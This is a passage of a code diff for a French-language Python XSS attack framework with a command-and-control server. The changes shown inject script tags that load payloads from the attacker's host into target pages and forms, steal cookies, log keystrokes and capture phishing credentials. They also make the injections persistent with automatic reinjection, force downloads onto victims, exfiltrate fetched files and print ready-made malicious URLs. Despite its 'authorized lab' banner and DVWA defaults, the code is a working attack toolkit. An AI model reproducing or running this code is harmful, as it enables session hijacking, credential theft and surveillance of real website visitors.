+                                timeout=TIMEOUT_HTTP, allow_redirects=True)
+            if probe_tag in resp.text:
+                working_forms.append((form_info, "injected + reflected"))
+                continue
+            # Vérifie si le payload persiste en base côté cible
+            check = session.get(url, timeout=TIMEOUT_HTTP)
+            if probe_tag in check.text:
+                working_forms.append((form_info, "injected + STORED (persistant)"))
             else:
-                # Vérifie si le payload persiste
-                check = session.get(url, timeout=TIMEOUT_HTTP)
-                if script_tag in check.text:
-                    results.append({"form": form_info["action"], "status": "injected + stored"})
-                else:
-                    results.append({"form": form_info["action"], "status": "injecté, pas de réflexion visible"})
+                results.append({"form": form_info["action"], "status": "injecté mais non persistant/réfléchi"})
         except requests.RequestException as e:
             results.append({"form": form_info["action"], "status": f"erreur: {e}"})
 
-    # Enregistre en base
+    if not working_forms:
+        return None, results
+
+    # Enregistre en base puis réinjecte avec le vrai ID dans les formulaires fonctionnels
     conn = sqlite3.connect(DB_FILE)
     c = conn.cursor()
     c.execute("""INSERT INTO injections (url, param, payload, method, type, status, created_at)
                  VALUES (?,?,?,?,?,?,?)""",
               (url, "forms", payload_type, "POST(form)", "stored_exploit", "active",
                datetime.now(timezone.utc).isoformat()))
+    injection_db_id = c.lastrowid
     conn.commit()
     conn.close()
 
-    return inj_id, results
+    final_tag = script_template.replace("{INJ}", str(injection_db_id))
+    for form_info, _ in working_forms:
+        inject_data = {}
+        for field in form_info.get("fields", []):
+            if field.get("type") in ("text", "textarea", "hidden", "search", "url", "email"):
+                inject_data[field["name"]] = final_tag
+            elif field.get("type") == "submit":
+                inject_data[field["name"]] = field.get("value", "submit")
+        try:
+            session.post(form_info["action"], data=inject_data, timeout=TIMEOUT_HTTP, allow_redirects=True)
+        except requests.RequestException:
+            pass
+
+    for form_info, status in working_forms:
+        results.append({"form": form_info["action"], "status": f"{status} (ID {injection_db_id})"})
+
+    return injection_db_id, results
 
 
 # ═════════════════════════════════════════════════════════════════════
@@ -865,7 +849,7 @@ def exploit_stored(url, forms, payload_type, extra="", cookies=None):
 # ═════════════════════════════════════════════════════════════════════
 
 class PersistenceManager:
-    """Gère la persistance des injections XSS"""
+    """Gère la persistance des injections XSS (réinjection auto)"""
 
     def __init__(self):
         self.running = False
@@ -884,6 +868,9 @@ class PersistenceManager:
 
     def stop(self):
         """Arrête la surveillance"""
+        if not self.running:
+            CONSOLE.print("[yellow]La persistance n'est pas active.[/yellow]")
+            return
         self.running = False
         if self.thread:
             self.thread.join(timeout=5)
@@ -902,7 +889,7 @@ class PersistenceManager:
         """Vérifie si les injections actives sont toujours présentes, réinjecte sinon"""
         conn = sqlite3.connect(DB_FILE)
         c = conn.cursor()
-        c.execute("SELECT id, url, param, payload, method FROM injections WHERE status = 'active' AND type = 'exploit'")
+        c.execute("SELECT id, url, param, payload, method FROM injections WHERE status = 'active'")
         active_injections = c.fetchall()
         conn.close()
 
@@ -910,16 +897,12 @@ class PersistenceManager:
         session.headers.update({"User-Agent": USER_AGENT})
 
         for inj in active_injections:
-            inj_id_db, url, param, payload_type, method = inj
-            # Vérifie si la page contient toujours notre marker
+            inj_db_id, url, param, payload_type, method = inj
             try:
-                resp = session.get(url, timeout=TIMEOUT_HTTP)
-                body = resp.text
-                # Si on ne trouve plus de référence à notre C2, on réinjecte
-                if C2_PUBLIC not in body:
+                resp = session.get(url.split("?")[0], timeout=TIMEOUT_HTTP)
+                if C2_PUBLIC not in resp.text:
                     CONSOLE.print(f"[yellow]Persistance : payload disparu sur {url} — réinjection...[/yellow]")
-                    new_inj_id = str(uuid.uuid4())[:8]
-                    script_tag = f"<script src='{C2_PUBLIC}/payload/{new_inj_id}?t={payload_type}'></script>"
+                    script_tag = f"<script src='{C2_PUBLIC}/payload/{inj_db_id}?t={payload_type}'></script>"
                     parsed = urlparse(url)
                     qs = parse_qs(parsed.query)
                     clean_url = url.split("?")[0]
@@ -930,15 +913,16 @@ class PersistenceManager:
                             session.get(clean_url, params=test_params, timeout=TIMEOUT_HTTP)
                         else:
                             session.post(url, data=test_params, timeout=TIMEOUT_HTTP)
-                    CONSOLE.print(f"[green]Réinjection effectuée sur {url}[/green]")
+                        CONSOLE.print(f"[green]Réinjection effectuée sur {url}[/green]")
             except requests.RequestException:
                 pass
 
     def list_injections(self):
-        """Liste toutes les injections actives"""
+        """Liste toutes les injections"""
         conn = sqlite3.connect(DB_FILE)
         c = conn.cursor()
-        c.execute("SELECT id, url, param, payload, method, status, executions, last_seen, created_at FROM injections ORDER BY created_at DESC")
+        c.execute("SELECT id, url, param, payload, method, status, executions, last_seen, created_at "
+                  "FROM injections ORDER BY created_at DESC")
         rows = c.fetchall()
         conn.close()
         return rows
@@ -951,25 +935,18 @@ persistence_mgr = PersistenceManager()
 # MODULE FICHIERS
 # ═════════════════════════════════════════════════════════════════════
 
-def file_upload_via_xss(url, param, method, local_file_path, remote_path="/upload"):
-    """
-    Tente d'uploader un fichier via une XSS (simule un upload forcé côté serveur).
-    Dans un contexte réel, l'upload se fait via une requête HTTP classique.
-    """
+def file_upload_to_target(url, local_file_path, remote_path="/upload", cookies_str=None):
+    """Upload un fichier local vers le site cible via HTTP POST multipart"""
     if not os.path.isfile(local_file_path):
         CONSOLE.print(f"[red]Fichier introuvable : {local_file_path}[/red]")
         return None
 
-    session = requests.Session()
-    session.headers.update({"User-Agent": USER_AGENT})
-
-    with open(local_file_path, "rb") as f:
-        file_content = f.read()
-
+    session = build_session(cookies_str)
     filename = os.path.basename(local_file_path)
 
     try:
-        resp = session.post(urljoin(url, remote_path), files={"file": (filename, file_content)}, timeout=TIMEOUT_HTTP)
+        with open(local_file_path, "rb") as f:
+            resp = session.post(urljoin(url, remote_path), files={"file": (filename, f)}, timeout=TIMEOUT_HTTP)
         conn = sqlite3.connect(DB_FILE)
         c = conn.cursor()
         c.execute("INSERT INTO files (action, remote_url, local_path, status, timestamp) VALUES (?,?,?,?,?)",
@@ -983,21 +960,16 @@ def file_upload_via_xss(url, param, method, local_file_path, remote_path="/uploa
         return None
 
 
-def file_download_via_xss(url, param, method, remote_file_url, local_save_path):
-    """
-    Utilise la XSS pour faire télécharger un fichier à la victime (fetch + exfil).
-    """
-    inj_id = str(uuid.uuid4())[:8]
-    js = build_js_payload("fetch_file", inj_id, remote_file_url)
-    script_tag = f"<script src='{C2_PUBLIC}/payload/{inj_id}?t=fetch_file&extra={quote(remote_file_url)}'></script>"
+def file_download_via_xss(url, param, method, remote_file_url, cookies_str=None):
+    """Injecte un payload fetch_file : la victime fetch l'URL et exfiltre le contenu vers le C2"""
+    session = build_session(cookies_str)
 
-    session = requests.Session()
-    session.headers.update({"User-Agent": USER_AGENT})
+    script_tag = f"<script src='{C2_PUBLIC}/payload/PROBE?t=fetch_file&extra={quote(remote_file_url)}'></script>"
 
     parsed = urlparse(url)
     qs = parse_qs(parsed.query)
     clean_url = url.split("?")[0]
-    test_params = {k: v[0] for k, v in qs.items()}
+    test_params = {k: v[0] for k, v in qs.items()} if qs else {}
     test_params[param] = script_tag
 
     try:
@@ -1009,46 +981,41 @@ def file_download_via_xss(url, param, method, remote_file_url, local_save_path):
         conn = sqlite3.connect(DB_FILE)
         c = conn.cursor()
         c.execute("INSERT INTO files (action, remote_url, local_path, status, timestamp) VALUES (?,?,?,?,?)",
-                  ("download_trigger", remote_file_url, local_save_path, f"HTTP {resp.status_code}",
+                  ("download_trigger", remote_file_url, "-", f"HTTP {resp.status_code}",
                    datetime.now(timezone.utc).isoformat()))
         conn.commit()
         conn.close()
-        return {"status": resp.status_code, "inj_id": inj_id}
+        return {"status": resp.status_code}
     except requests.RequestException as e:
         CONSOLE.print(f"[red]Erreur : {e}[/red]")
         return None
 
 
-def file_upload_to_victim(injection_id, local_file, param, url, method):
-    """Fait télécharger un fichier à la victime via XSS"""
+def file_upload_to_victim(local_file, param, url, method, cookies_str=None):
+    """Fait télécharger un fichier du C2 par la victime via XSS (download forcé)"""
     if not os.path.isfile(local_file):
         CONSOLE.print(f"[red]Fichier introuvable : {local_file}[/red]")
         return
 
-    # Copie le fichier dans le répertoire C2
     filename = os.path.basename(local_file)
     dest = os.path.join(C2_DIR, filename)
     with open(local_file, "rb") as src, open(dest, "wb") as dst:
         dst.write(src.read())
 
-    js = build_js_payload("download_forced", injection_id, filename)
-    script_tag = f"<script src='{C2_PUBLIC}/payload/{injection_id}?t=download_forced&extra={quote(filename)}'></script>"
-
-    session = requests.Session()
-    session.headers.update({"User-Agent": USER_AGENT})
+    session = build_session(cookies_str)
 
     parsed = urlparse(url)
     qs = parse_qs(parsed.query)
     clean_url = url.split("?")[0]
-    test_params = {k: v[0] for k, v in qs.items()}
-    test_params[param] = script_tag
+    test_params = {k: v[0] for k, v in qs.items()} if qs else {}
+    test_params[param] = f"<script src='{C2_PUBLIC}/payload/PROBE?t=download_forced&extra={quote(filename)}'></script>"
 
     try:
         if method.upper() == "GET":
             session.get(clean_url, params=test_params, timeout=TIMEOUT_HTTP)
         else:
             session.post(url, data=test_params, timeout=TIMEOUT_HTTP)
-        CONSOLE.print(f"[green]Upload forcé injecté — la victime téléchargera {filename}[/green]")
+        CONSOLE.print(f"[green]Download forcé injecté — la victime téléchargera {filename}[/green]")
     except requests.RequestException as e:
         CONSOLE.print(f"[red]Erreur : {e}[/red]")
 
@@ -1061,7 +1028,6 @@ def generate_html_report():
     """Génère un rapport HTML complet"""
     conn = sqlite3.connect(DB_FILE)
     c = conn.cursor()
-
     c.execute("SELECT * FROM captures ORDER BY timestamp DESC")
     captures = c.fetchall()
     c.execute("SELECT * FROM injections ORDER BY created_at DESC")
@@ -1074,27 +1040,22 @@ def generate_html_report():
 <html lang="fr">
 <head>
 <meta charset="UTF-8">
-<title>Rapport XSS Framework Ultime</title>
+<title>Rapport XSS Framework Ultime — Jathniel</title>
 <style>
 body {{ font-family: 'Segoe UI', sans-serif; background: #1a1a2e; color: #eee; margin: 0; padding: 20px; }}
 h1 {{ color: #e94560; text-align: center; }}
-h2 {{ color: #0f3460; color: #e94560; border-bottom: 2px solid #e94560; padding-bottom: 5px; }}
+h2 {{ color: #e94560; border-bottom: 2px solid #e94560; padding-bottom: 5px; }}
 table {{ width: 100%; border-collapse: collapse; margin: 15px 0; }}
 th {{ background: #16213e; color: #e94560; padding: 10px; text-align: left; }}
-td {{ padding: 8px; border-bottom: 1px solid #333; }}
+td {{ padding: 8px; border-bottom: 1px solid #333; word-break: break-all; }}
 tr:hover {{ background: #16213e; }}
-.badge {{ padding: 3px 8px; border-radius: 3px; font-size: 11px; font-weight: bold; }}
-.badge-red {{ background: #e94560; color: white; }}
-.badge-green {{ background: #2ecc71; color: white; }}
-.badge-blue {{ background: #3498db; color: white; }}
-.badge-orange {{ background: #f39c12; color: white; }}
 .stat {{ display: inline-block; background: #16213e; padding: 15px 25px; margin: 5px; border-radius: 8px; text-align: center; }}
 .stat-num {{ font-size: 28px; font-weight: bold; color: #e94560; }}
 .stat-label {{ font-size: 12px; color: #999; }}
 </style>
 </head>
 <body>
-<h1>⚡ XSS FRAMEWORK ULTIME — Rapport</h1>
+<h1>XSS FRAMEWORK ULTIME — Rapport — Jathniel</h1>
 <p style="text-align:center;">Généré le {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
 
 <div style="text-align:center;">
@@ -1103,46 +1064,44 @@ tr:hover {{ background: #16213e; }}
 <div class="stat"><div class="stat-num">{len(files)}</div><div class="stat-label">Fichiers</div></div>
 </div>
 
-<h2>🍪 Cookies Volés</h2>
+<h2>Cookies volés</h2>
 <table><tr><th>Date</th><th>IP</th><th>URL</th><th>Cookies</th></tr>"""
     for cap in captures:
         if cap[1] == "cookies":
-            data = json.loads(cap[5]) if cap[5] else {}
-            html += f"<tr><td>{cap[7]}</td><td>{cap[2]}</td><td>{cap[4]}</td><td>{data.get('cookies','')[:100]}</td></tr>"
+            html += f"<tr><td>{cap[7]}</td><td>{cap[2]}</td><td>{cap[4]}</td><td>{(cap[5] or '')[:120]}</td></tr>"
     html += "</table>"
 
-    html += "<h2>⌨️ Keylogger</h2><table><tr><th>Date</th><th>IP</th><th>URL</th><th>Touches</th></tr>"
+    html += "<h2>Frappes clavier</h2><table><tr><th>Date</th><th>IP</th><th>URL</th><th>Touches</th></tr>"
     for cap in captures:
         if cap[1] == "keylogger":
-            data = json.loads(cap[5]) if cap[5] else {}
-            html += f"<tr><td>{cap[7]}</td><td>{cap[2]}</td><td>{cap[4]}</td><td>{data.get('keys','')[:100]}</td></tr>"
+            html += f"<tr><td>{cap[7]}</td><td>{cap[2]}</td><td>{cap[4]}</td><td>{(cap[5] or '')[:120]}</td></tr>"
     html += "</table>"
 
-    html += "<h2>🎣 Phishing</h2><table><tr><th>Date</th><th>IP</th><th>URL</th><th>Identifiants</th></tr>"
+    html += "<h2>Phishing</h2><table><tr><th>Date</th><th>IP</th><th>URL</th><th>Données</th></tr>"
     for cap in captures:
         if cap[1] == "phishing":
-            html += f"<tr><td>{cap[7]}</td><td>{cap[2]}</td><td>{cap[4]}</td><td>{cap[5][:100]}</td></tr>"
+            html += f"<tr><td>{cap[7]}</td><td>{cap[2]}</td><td>{cap[4]}</td><td>{(cap[5] or '')[:120]}</td></tr>"
     html += "</table>"
 
-    html += "<h2>📡 Beacons</h2><table><tr><th>Date</th><th>IP</th><th>URL</th><th>Données</th></tr>"
+    html += "<h2>Beacons</h2><table><tr><th>Date</th><th>IP</th><th>URL</th><th>Données</th></tr>"
     for cap in captures:
         if cap[1] in ("beacon", "beacon_info"):
-            html += f"<tr><td>{cap[7]}</td><td>{cap[2]}</td><td>{cap[4]}</td><td>{cap[5][:100]}</td></tr>"
+            html += f"<tr><td>{cap[7]}</td><td>{cap[2]}</td><td>{cap[4]}</td><td>{(cap[5] or '')[:120]}</td></tr>"
     html += "</table>"
 
-    html += "<h2>💉 Injections</h2><table><tr><th>ID</th><th>URL</th><th>Param</th><th>Type</th><th>Méthode</th><th>Status</th><th>Exéc.</th><th>Créé</th></tr>"
+    html += ("<h2>Injections</h2><table><tr><th>ID</th><th>URL</th><th>Param</th><th>Type</th>"
+             "<th>Méthode</th><th>Status</th><th>Exéc.</th><th>Créé</th></tr>")
     for inj in injections:
-        html += f"<tr><td>{inj[0]}</td><td>{inj[1][:60]}</td><td>{inj[2]}</td><td><span class='badge badge-red'>{inj[4]}</span></td><td>{inj[3]}</td><td>{inj[5]}</td><td>{inj[6]}</td><td>{inj[8]}</td></tr>"
+        html += (f"<tr><td>{inj[0]}</td><td>{inj[1][:60]}</td><td>{inj[2]}</td><td>{inj[4]}</td>"
+                 f"<td>{inj[3]}</td><td>{inj[5]}</td><td>{inj[6]}</td><td>{inj[8]}</td></tr>")
     html += "</table>"
 
-    html += "<h2>📁 Fichiers</h2><table><tr><th>Action</th><th>URL distante</th><th>Chemin local</th><th>Status</th><th>Date</th></tr>"
+    html += "<h2>Fichiers</h2><table><tr><th>Action</th><th>URL distante</th><th>Chemin local</th><th>Status</th><th>Date</th></tr>"
     for f in files:
-        html += f"<tr><td><span class='badge badge-blue'>{f[1]}</span></td><td>{f[2]}</td><td>{f[3]}</td><td>{f[4]}</td><td>{f[5]}</td></tr>"
-    html += "</table>"
+        html += f"<tr><td>{f[1]}</td><td>{f[2]}</td><td>{f[3]}</td><td>{f[4]}</td><td>{f[5]}</td></tr>"
+    html += "</table></body></html>"
 
-    html += "</body></html>"
-
-    report_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "rapport_xss.html")
+    report_path = os.path.join(BASE_DIR, "rapport_xss.html")
     with open(report_path, "w", encoding="utf-8") as f:
         f.write(html)
     return report_path
@@ -1158,8 +1117,8 @@ BANNER = """
 ║   ██╗  ██╗███████╗███████╗                                    ║
 ║   ██║ ██╔╝██╔════╝██╔════╝   XSS FRAMEWORK ULTIME             ║
 ║   █████╔╝ ███████╗███████╗   ─── PERSISTANCE EDITION ───      ║
-║   ██╔═██╗ ╚════██║╚════██║   v1.0                             ║
-║   ██║  ██╗███████║███████║   Labo / CTF / Pentest autorisé   ║
+║   ██╔═██╗ ╚════██║╚════██║   v1.1 — by JATHNIEL               ║
+║   ██║  ██╗███████║███████║   Labo / CTF / Pentest autorisé    ║
 ║   ╚═╝  ╚═╝╚══════╝╚══════╝                                    ║
 ╚═══════════════════════════════════════════════════════════════╝
 [/bold red]
@@ -1169,7 +1128,7 @@ BANNER = """
 def print_banner():
     CONSOLE.print(BANNER)
     CONSOLE.print(Panel(
-        "[bold yellow]⚠ Outil de test de sécurité — Usage exclusif dans un cadre légal[/bold yellow]\n"
+        "[bold yellow]Outil de test de sécurité — Usage exclusif dans un cadre légal[/bold yellow]\n"
         "[dim]Labo personnel, CTF, pentests autorisés uniquement.[/dim]",
         border_style="red"
     ))
@@ -1181,24 +1140,34 @@ def press_enter():
 
 
 def ask_url():
-    return Prompt.ask("[cyan]URL cible[/cyan]", default="http://127.0.0.1:8081")
+    return Prompt.ask("[cyan]URL cible[/cyan]", default="http://127.0.0.1/DVWA/vulnerabilities/xss_s/")
 
 
 def ask_param():
-    return Prompt.ask("[cyan]Paramètre à injecter[/cyan]", default="q")
+    return Prompt.ask("[cyan]Paramètre à injecter[/cyan]", default="name")
 
 
 def ask_method():
     return Prompt.ask("[cyan]Méthode[/cyan]", choices=["GET", "POST"], default="GET")
 
 
+def ask_cookies():
+    """Demande les cookies de session (optionnel) — nécessaires pour les
+    pages authentifiées comme DVWA. Format : PHPSESSID=xxx; security=low"""
+    cookies = Prompt.ask(
+        "[cyan]Cookies de session (optionnel, vide pour aucun)[/cyan]",
+        default=""
+    )
+    return cookies or None
+
+
 def menu_scan():
     CONSOLE.print("\n[bold cyan]═══ SCAN XSS ═══[/bold cyan]\n")
     url = ask_url()
     method = ask_method()
+    cookies = ask_cookies()
 
-    session = requests.Session()
-    session.headers.update({"User-Agent": USER_AGENT})
+    session = build_session(cookies)
 
     # Détecte les formulaires
     try:
@@ -1212,7 +1181,7 @@ def menu_scan():
 
     # Scan réflexe
     with CONSOLE.status("[bold green]Scan en cours..."):
-        results = scan_reflected(url, method=method)
+        results = scan_reflected(url, method=method, cookies_str=cookies)
 
     table = Table(title="Résultats Scan XSS", box=box.ROUNDED)
     table.add_column("Param", style="cyan")
@@ -1232,10 +1201,10 @@ def menu_scan():
     # Scan stocké si formulaires
     if forms:
         CONSOLE.print("\n[bold cyan]Scan XSS Stocké...[/bold cyan]")
-        stored_results = scan_stored(url, forms=forms)
+        stored_results = scan_stored(url, forms, cookies_str=cookies)
         if stored_results:
             st = Table(title="XSS Stocké — Résultats", box=box.ROUNDED)
-            st.add_column("Form", style="cyan")
+            st.add_column("Champs", style="cyan")
             st.add_column("Payload", style="yellow", max_width=40)
             st.add_column("Preuve", style="green")
             for r in stored_results:
@@ -1247,8 +1216,7 @@ def menu_scan():
     # Enregistre la cible
     conn = sqlite3.connect(DB_FILE)
     c = conn.cursor()
-    c.execute("""INSERT OR REPLACE INTO targets (url, forms_found, vulns_found, last_scan)
-                 VALUES (?,?,?,?)""",
+    c.execute("INSERT OR REPLACE INTO targets (url, forms_found, vulns_found, last_scan) VALUES (?,?,?,?)",
               (url, len(forms), len(results), datetime.now(timezone.utc).isoformat()))
     conn.commit()
     conn.close()
@@ -1258,14 +1226,14 @@ def menu_scan():
 
 def menu_exploit():
     CONSOLE.print("\n[bold cyan]═══ EXPLOITATION ═══[/bold cyan]\n")
-    CONSOLE.print("  [1] 🍪 Vol de cookies")
-    CONSOLE.print("  [2] 🎣 Phishing (formulaire de connexion)")
-    CONSOLE.print("  [3] 🎨 Défiguration (defacement)")
-    CONSOLE.print("  [4] ⌨️  Keylogger")
-    CONSOLE.print("  [5] 🔄 Redirection")
-    CONSOLE.print("  [6] 📡 Beacon (surveillance continue)")
-    CONSOLE.print("  [7] 💥 Combinaison complète (cookies + keylogger + persistance)")
-    CONSOLE.print("  [0] ← Retour\n")
+    CONSOLE.print("  [1] Vol de cookies")
+    CONSOLE.print("  [2] Phishing (formulaire de connexion)")
+    CONSOLE.print("  [3] Défiguration (defacement)")
+    CONSOLE.print("  [4] Keylogger")
+    CONSOLE.print("  [5] Redirection")
+    CONSOLE.print("  [6] Beacon (surveillance continue)")
+    CONSOLE.print("  [7] Combinaison complète (cookies + keylogger + persistance)")
+    CONSOLE.print("  [0] <- Retour\n")
 
     choice = Prompt.ask("[yellow]Choix[/yellow]", default="1")
     if choice == "0":
@@ -1274,6 +1242,7 @@ def menu_exploit():
     url = ask_url()
     param = ask_param()
     method = ask_method()
+    cookies = ask_cookies()
 
     payload_map = {
         "1": "cookies", "2": "phishing", "3": "deface",
@@ -1285,13 +1254,19 @@ def menu_exploit():
         extra = Prompt.ask("[cyan]URL de redirection[/cyan]", default="https://example.com")
 
     with CONSOLE.status("[bold green]Injection en cours..."):
-        inj_id, script_tag = exploit_inject(url, param, method, payload_type, extra)
+        inj_id, script_tag = exploit_inject(url, param, method, payload_type, extra, cookies_str=cookies)
 
-    CONSOLE.print(f"\n[bold green]✓ Injection réussie ![/bold green]")
-    CONSOLE.print(f"[cyan]Injection ID : {inj_id}[/cyan]")
+    CONSOLE.print(f"\n[bold green]Injection enregistrée (ID BDD: {inj_id})[/bold green]")
     CONSOLE.print(f"[dim]Payload : {script_tag[:100]}...[/dim]")
-    CONSOLE.print(f"\n[yellow]Le payload s'exécutera quand une victime visitera l'URL.[/yellow]")
-    CONSOLE.print(f"[dim]Vérifie les captures via le menu [5] Données Capturées[/dim]")
+
+    # Affiche l'URL malveillante prête à transmettre
+    parsed = urlparse(url)
+    clean_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
+    from urllib.parse import urlencode
+    malicious_url = f"{clean_url}?{urlencode({param: script_tag})}"
+    CONSOLE.print(f"\n[bold yellow]URL malveillante (à faire visiter à la 'victime') :[/bold yellow]")
+    CONSOLE.print(f"[cyan]{malicious_url}[/cyan]")
+    CONSOLE.print(f"\n[dim]Consulte les captures via le menu [5] Données Capturées[/dim]")
 
     press_enter()
 
@@ -1299,9 +1274,9 @@ def menu_exploit():
 def menu_stored():
     CONSOLE.print("\n[bold cyan]═══ XSS STOCKÉ ═══[/bold cyan]\n")
     url = ask_url()
+    cookies = ask_cookies()
 
-    session = requests.Session()
-    session.headers.update({"User-Agent": USER_AGENT})
+    session = build_session(cookies)
 
     try:
         resp = session.get(url, timeout=TIMEOUT_HTTP)
@@ -1326,10 +1301,10 @@ def menu_stored():
         table.add_row(str(i), f["action"][:50], f["method"], field_names)
     CONSOLE.print(table)
 
-    CONSOLE.print("\n  [1] 🍪 Vol de cookies (stocké)")
-    CONSOLE.print("  [2] ⌨️  Keylogger (stocké)")
-    CONSOLE.print("  [3] 📡 Beacon + Persistance (stocké)")
-    CONSOLE.print("  [0] ← Retour\n")
+    CONSOLE.print("\n  [1] Vol de cookies (stocké)")
+    CONSOLE.print("  [2] Keylogger (stocké)")
+    CONSOLE.print("  [3] Beacon + Persistance (stocké)")
+    CONSOLE.print("  [0] <- Retour\n")
 
     choice = Prompt.ask("[yellow]Choix[/yellow]", default="3")
     if choice == "0":
@@ -1339,10 +1314,13 @@ def menu_stored():
     payload_type = payload_map.get(choice, "combined")
 
     with CONSOLE.status("[bold green]Injection stockée en cours..."):
-        inj_id, results = exploit_stored(url, forms, payload_type)
+        inj_id, results = exploit_stored(url, forms, payload_type, cookies_str=cookies)
 
-    CONSOLE.print(f"\n[bold green]✓ Injection stockée effectuée ![/bold green]")
-    CONSOLE.print(f"[cyan]Injection ID : {inj_id}[/cyan]\n")
+    if inj_id:
+        CONSOLE.print(f"\n[bold green]Injection stockée active (ID BDD: {inj_id})[/bold green]")
+        CONSOLE.print("[yellow]Le payload s'exécutera pour tout visiteur de la page.[/yellow]")
+    else:
+        CONSOLE.print("\n[red]Aucun formulaire fonctionnel — vérifie les cookies de session.[/red]")
 
     rt = Table(title="Résultats", box=box.ROUNDED)
     rt.add_column("Formulaire", style="cyan")
@@ -1356,11 +1334,11 @@ def menu_stored():
 
 def menu_persistence():
     CONSOLE.print("\n[bold cyan]═══ PERSISTANCE ═══[/bold cyan]\n")
-    CONSOLE.print("  [1] ✅ Activer la persistance (réinjection auto)")
-    CONSOLE.print("  [2] ❌ Désactiver la persistance")
-    CONSOLE.print("  [3] 📋 Lister les injections actives")
-    CONSOLE.print("  [4] 🗑️  Supprimer une injection")
-    CONSOLE.print("  [0] ← Retour\n")
+    CONSOLE.print("  [1] Activer la persistance (réinjection auto)")
+    CONSOLE.print("  [2] Désactiver la persistance")
+    CONSOLE.print("  [3] Lister les injections actives")
+    CONSOLE.print("  [4] Supprimer une injection")
+    CONSOLE.print("  [0] <- Retour\n")
 
     choice = Prompt.ask("[yellow]Choix[/yellow]", default="1")
 
@@ -1370,7 +1348,7 @@ def menu_persistence():
         persistence_mgr.stop()
     elif choice == "3":
         rows = persistence_mgr.list_injections()
-        table = Table(title="Injections Actives", box=box.ROUNDED)
+        table = Table(title="Injections", box=box.ROUNDED)
         table.add_column("ID", style="cyan")
         table.add_column("URL", style="yellow", max_width=40)
         table.add_column("Param", style="magenta")
@@ -1383,23 +1361,26 @@ def menu_persistence():
         CONSOLE.print(table)
     elif choice == "4":
         inj_id = Prompt.ask("[cyan]ID de l'injection à supprimer[/cyan]")
-        conn = sqlite3.connect(DB_FILE)
-        c = conn.cursor()
-        c.execute("DELETE FROM injections WHERE id = ?", (int(inj_id),))
-        conn.commit()
-        conn.close()
-        CONSOLE.print(f"[green]Injection {inj_id} supprimée.[/green]")
+        try:
+            conn = sqlite3.connect(DB_FILE)
+            c = conn.cursor()
+            c.execute("DELETE FROM injections WHERE id = ?", (int(inj_id),))
+            conn.commit()
+            conn.close()
+            CONSOLE.print(f"[green]Injection {inj_id} supprimée.[/green]")
+        except ValueError:
+            CONSOLE.print("[red]ID invalide.[/red]")
 
     press_enter()
 
 
 def menu_files():
     CONSOLE.print("\n[bold cyan]═══ FICHIERS ═══[/bold cyan]\n")
-    CONSOLE.print("  [1] 📤 Upload un fichier vers le site cible")
-    CONSOLE.print("  [2] 📥 Forcer la victime à télécharger un fichier")
-    CONSOLE.print("  [3] 📂 Récupérer un fichier depuis la victime (via XSS)")
-    CONSOLE.print("  [4] 📋 Historique des opérations fichiers")
-    CONSOLE.print("  [0] ← Retour\n")
+    CONSOLE.print("  [1] Upload un fichier vers le site cible")
+    CONSOLE.print("  [2] Forcer la victime à télécharger un fichier")
+    CONSOLE.print("  [3] Récupérer un fichier/page depuis la victime (via XSS)")
+    CONSOLE.print("  [4] Historique des opérations fichiers")
+    CONSOLE.print("  [0] <- Retour\n")
 
     choice = Prompt.ask("[yellow]Choix[/yellow]", default="1")
     if choice == "0":
@@ -1409,7 +1390,8 @@ def menu_files():
         url = ask_url()
         path = Prompt.ask("[cyan]Chemin local du fichier[/cyan]")
         remote = Prompt.ask("[cyan]Chemin d'upload sur le serveur[/cyan]", default="/upload")
-        result = file_upload_via_xss(url, "", "POST", path, remote)
+        cookies = ask_cookies()
+        result = file_upload_to_target(url, path, remote, cookies_str=cookies)
         if result:
             CONSOLE.print(f"[green]Upload effectué : HTTP {result['status']}[/green]")
 
@@ -1418,20 +1400,19 @@ def menu_files():
         param = ask_param()
         method = ask_method()
         path = Prompt.ask("[cyan]Fichier local à faire télécharger[/cyan]")
-        inj_id = Prompt.ask("[cyan]Injection ID existante (ou vide pour nouvelle)[/cyan]", default="")
-        if not inj_id:
-            inj_id = str(uuid.uuid4())[:8]
-        file_upload_to_victim(inj_id, path, param, url, method)
+        cookies = ask_cookies()
+        file_upload_to_victim(path, param, url, method, cookies_str=cookies)
 
     elif choice == "3":
         url = ask_url()
         param = ask_param()
         method = ask_method()
-        remote_file = Prompt.ask("[cyan]URL du fichier à récupérer depuis la victime[/cyan]")
-        result = file_download_via_xss(url, param, method, remote_file, "")
+        remote_file = Prompt.ask("[cyan]URL du fichier/page à récupérer depuis la victime[/cyan]")
+        cookies = ask_cookies()
+        result = file_download_via_xss(url, param, method, remote_file, cookies_str=cookies)
         if result:
-            CONSOLE.print(f"[green]Payload de fetch injecté (ID: {result['inj_id']})[/green]")
-            CONSOLE.print("[dim]Le contenu sera visible dans les captures 'beacon_info'[/dim]")
+            CONSOLE.print(f"[green]Payload de fetch injecté[/green]")
+            CONSOLE.print("[dim]Le contenu apparaîtra dans les captures 'beacon_info' (menu [5])[/dim]")
 
     elif choice == "4":
         conn = sqlite3.connect(DB_FILE)
@@ -1446,7 +1427,7 @@ def menu_files():
         table.add_column("Status", style="green")
         table.add_column("Date", style="dim")
         for r in rows:
-            table.add_row(r[1], r[2][:40], r[3][:30] if r[3] else "", r[4], r[5])
+            table.add_row(r[1], r[2][:40], (r[3] or "")[:30], r[4], r[5])
         CONSOLE.print(table)
 
     press_enter()
@@ -1454,21 +1435,19 @@ def menu_files():
 
 def menu_captures():
     CONSOLE.print("\n[bold cyan]═══ DONNÉES CAPTURÉES ═══[/bold cyan]\n")
-    CONSOLE.print("  [1] 🍪 Cookies volés")
-    CONSOLE.print("  [2] 🎣 Identifiants phishing")
-    CONSOLE.print("  [3] ⌨️  Frappes clavier")
-    CONSOLE.print("  [4] 📡 Beacons")
-    CONSOLE.print("  [5] 📊 Tout afficher")
-    CONSOLE.print("  [0] ← Retour\n")
+    CONSOLE.print("  [1] Cookies volés")
+    CONSOLE.print("  [2] Identifiants phishing")
+    CONSOLE.print("  [3] Frappes clavier")
+    CONSOLE.print("  [4] Beacons")
+    CONSOLE.print("  [5] Tout afficher")
+    CONSOLE.print("  [0] <- Retour\n")
 
     choice = Prompt.ask("[yellow]Choix[/yellow]", default="5")
     if choice == "0":
         return
 
-    type_filter = None
     type_map = {"1": "cookies", "2": "phishing", "3": "keylogger", "4": "beacon"}
-    if choice in type_map:
-        type_filter = type_map[choice]
